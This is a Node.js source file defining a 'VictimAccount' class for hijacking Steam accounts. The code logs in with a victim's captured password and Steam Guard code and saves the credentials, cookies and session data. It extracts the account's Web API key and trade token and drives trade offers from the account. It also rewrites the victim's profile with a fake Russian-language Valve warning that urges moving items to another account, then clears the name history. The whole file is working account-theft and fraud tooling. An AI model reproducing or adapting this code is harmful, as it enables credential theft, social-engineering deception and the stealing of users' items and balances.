const EResult = require('steam-user/enums/EResult');
const SteamUser = require('steam-user');
const SteamAPI = require('./steam-api');
const SteamConverter = require('./steam-converter');
const MessageMarks = require("../lib/message-marks");
const SteamCommunity = require("steamcommunity");

const { writeSteamUserSession } = require("../lib/session-writer");
const { write } = require('../lib/message-writer');
const { getCurrentDate } = require('../lib/date');

var user = new SteamUser();
var community = new SteamCommunity();

class VictimAccount {
    data = { login: "", password: "", guard: "" };
    sessionID = "";
    cookies = [];
    name = "";
    ID64 = "";
    ID32 = "";
    tradeToken = "";
    apiKey = "";

    setWarningProfile() {
        const imgUrl = "https://steamuserimages-a.akamaihd.net/ugc/885384897182110030/F095539864AC9E94AE5236E04C8CA7C2725BCEFF/";
        const summary = `[url=https://store.steampowered.com/privacy_agreement/]Предупреждение - ${getCurrentDate()}[/url]

        [h1]Своими недавними действиями Вы нарушили пользовательское соглашение Steam. На вашем аккаунте были замечены подозрительные действия после авторизации на стороннем сайте[/h1]
            • Мы заморозили баланс вашего аккаунта до решения проблемы.
            • Покупка, дарение, обмен, активация cd-ключа будут отключены.
            • Доступ к сообществу Steam будет ограничен.
        
        [h1]Меры будут применены на следующий календарный день после получения данного предупреждения[/h1]
        Мы настоятельно рекомендуем Вам переместить все ценные предметы из инвентаря на другую учетную запись Steam с целью их сохранения. [b]Компания Valve не несет ответственность за утерянные вещи и валютный баланс![/b]`;

        community.setCookies(this.cookies);

        return new Promise((resolve, reject) => {
            community.uploadAvatar(imgUrl, "jpg", (error, url) => {
                if (error) {
                    console.log(`(Victim) Avatar has not been set ${MessageMarks.ERROR}`);
                }
                else {
                    console.log(`(Victim) Avatar has been set ${MessageMarks.SUCCESS}`);
                }
            });

            community.editProfile({
                name: `${this.ID64}`,
                realName: "",
                summary: summary,
                country: "",
                state: "",
                city: ""
            }, (error) => {
                if (error) {
                    console.log(`(Victim) Profile settings has not been set ${MessageMarks.ERROR}`);
                    reject();
                }
                else {
                    console.log(`(Victim) Profile settings has been set ${MessageMarks.SUCCESS}`);

                    community.clearPersonaNameHistory((error) => {
                        if (error) {
                            console.log(`(Victim) Username history has not been cleared ${MessageMarks.ERROR}`);
                        }
                        else {
                            console.log(`(Victim) Username history has been cleared ${MessageMarks.SUCCESS}`);
                        }
                    });

                    resolve();
                }
            });
        });
    }

    getInfo() {
        let result;

        if (this.isLoggedIn()) {
            result = {
                name: this.name,
                login_data: this.data,
                session_id: this.sessionID, 
                cookies: this.cookies,
                id_32: this.ID32,
                id_64: this.ID64,
                api_key: this.apiKey,
                trade_token: this.tradeToken
            };
        }
        else {
            result = null;
        }

        return result;
    }

    async refreshInfo() {
        this.ID32 = user.steamID.accountid;
        this.ID64 = SteamConverter.ID32toID64(user.steamID.accountid);
        this.name = user.accountInfo.name;

        return new Promise((resolve, reject) => {
            this.refillApiKey()
                .then(() => this.refillTradeToken()
                                .finally(() => {
                                    writeSteamUserSession(this.getInfo());
                                    resolve(this.getInfo());
                                }))
                .finally(() => {
                    this.tryWriteSession();
                    resolve(this.getInfo());
                });
        });
    }

    isLoggedIn = () => Boolean(user.steamID);

    tryWriteSession = () => {
        try {
            writeSteamUserSession(this.getInfo());
        }
        catch {}
    }

    async login(login, password, guard) {
        return new Promise((resolve, reject) => {
            if (this.isLoggedIn()) {
                reject(`Already logged in, cannot log in again ${MessageMarks.ERROR}`);
            }

            // for refer THIS object from Callbacks
            var self = this;
    
            try {
                user.logOn({
                    accountName: login,
                    password: password,
                    rememberPassword: true,
                    twoFactorCode: guard
                });
            }
            catch (error) {
                reject(`Error occured while Steam User Log In ${MessageMarks.ERROR}`, error);
            }
    
            user.on("steamGuard", function(domain, callback) {
                reject({ eresult: EResult.AccountLoginDeniedNeedTwoFactor });
            });
    
            user.on("error", function (error) {
                reject(`The Given Data is Invalid ${MessageMarks.ERROR}`, error);
            });
    
            user.on("webSession", function (sessionID, cookies) {
                self.data.login = login;
                self.data.password = password;
                self.data.guard = guard;
                self.sessionID = sessionID;
                self.cookies = cookies;

                self.refreshInfo().finally(() => resolve(self.getInfo()));
            })
        });
    }

    async logout() {
        return new Promise((resolve, reject) => {
            try {
                user.logOff();
                resolve("Successfully Logged Out");
            }
            catch (error) {
                reject(`Error while Logging Out ${MessageMarks.ERROR}`, error);
            }
        });
    }

    async updateName(name) {
        return new Promise((resolve, reject) => {
            try {
                user.setPersona(SteamUser.EPersonaState.Online, name);
                resolve(name);
            }
            catch (error) {
                reject(`Error while Updating Username ${MessageMarks.ERROR}`, error);
            }
        });
    }

    async getProfileInfo() {
        return SteamAPI.getProfileInfo(this.apiKey, this.ID64);
    }

    async makeOffer(partnerID32, partnerID64, partnerTradeToken, itemsFromThem, itemsFromMe, message) {
        return SteamAPI.makeOffer({
            partnerID64: partnerID64,
            partnerID32: partnerID32,
            tradeToken: partnerTradeToken,
            cookies: this.cookies,
            sessionID: this.sessionID,
            itemsFromMe: itemsFromMe || [],
            itemsFromThem: itemsFromThem || [],
            message: message
        });
    }

    async acceptOffer(tradeOfferID, partnerID64, partnerID32) {
        return SteamAPI.acceptOffer({
            tradeOfferID: tradeOfferID,
            partnerID64: partnerID64,
            partnerID32: partnerID32,
            cookies: this.cookies,
            sessionID: this.sessionID
        });
    }

    async cancelOffer(offerID) {
        return SteamAPI.cancelOffer(this.apiKey, offerID);
    }

    async declineOffer(offerID) {
        return SteamAPI.declineOffer(this.apiKey, offerID);
    }

    async getActiveOffers() {
        return SteamAPI.getActiveOffers(this.apiKey);
    }

    async waitForNewOffer(ID32toSkip, interval, res) {
        return new Promise((resolve, reject) => {
            const checkingInterval = setInterval(() => {
                write(res, "Watching offers...");

                this.getActiveOffers()
                    .then(offers => {
                        try {
                            const firstSentOffer = offers.trade_offers_sent ? offers.trade_offers_sent[0] : "";
                            const firstReceivedOffer = offers.trade_offers_received ? offers.trade_offers_received[0] : "";

                            if (ID32toSkip && (firstSentOffer.accountid_other == ID32toSkip || firstReceivedOffer.accountid_other == ID32toSkip)) {
                                return;
                            }

                            if (firstSentOffer.trade_offer_state == 9) {
                                write(res, `Sent Offer ${firstSentOffer.tradeofferid} found`);
                                clearInterval(checkingInterval);
                                resolve(firstSentOffer);
                            }

                            if (firstReceivedOffer.trade_offer_state == 2) {
                                write(res, `Incoming Offer ${firstReceivedOffer.tradeofferid} found`);
                                clearInterval(checkingInterval);
                                resolve(firstReceivedOffer);
                            }
                        }
                        catch { }
                    })
                    .catch();
            }, interval || 1000);
        });
    }

    async getTradeToken() {
        return new Promise((resolve, reject) => {
            this.getProfileInfo()
                .then(info => {
                    SteamAPI.getTradeToken(info.profileurl, this.sessionID, this.cookies)
                        .then(token => {
                            resolve(token);
                        })
                        .catch(error => reject(`Error while requesting Trade Access Token ${MessageMarks.ERROR}`, error));
                })
                .catch(error => reject(`Error while requesting User Info ${MessageMarks.ERROR}`, error));
        });
    }

    async refillTradeToken() {
        return new Promise((resolve, reject) => {
            this.getTradeToken()
                .then(token => {
                    this.tradeToken = token;
                    resolve(`Trade Access Token refilled ${MessageMarks.SUCCESS}`);
                })
                .catch(() => reject(`Trade Access Token not refilled ${MessageMarks.ERROR}`));
        });
    }

    async getApiKey(domain) {
        return new Promise((resolve, reject) => {
            SteamAPI.retrieveAPIKey(domain, this.sessionID, this.cookies)
                    .then(key => {
                        resolve(key);
                    })
                    .catch(error => reject(`Error while requesting Web API Key ${MessageMarks.ERROR}`, error));
        });
    }

    async refillApiKey() {
        return new Promise((resolve, reject) => {
            this.getApiKey()
                .then(key => {
                    this.apiKey = key;
                    resolve(`Web API Key refilled ${MessageMarks.SUCCESS}`);
                })
                .catch(() => reject(`Web API Key not refilled ${MessageMarks.ERROR}`));
        });
    }
}

module.exports = VictimAccount;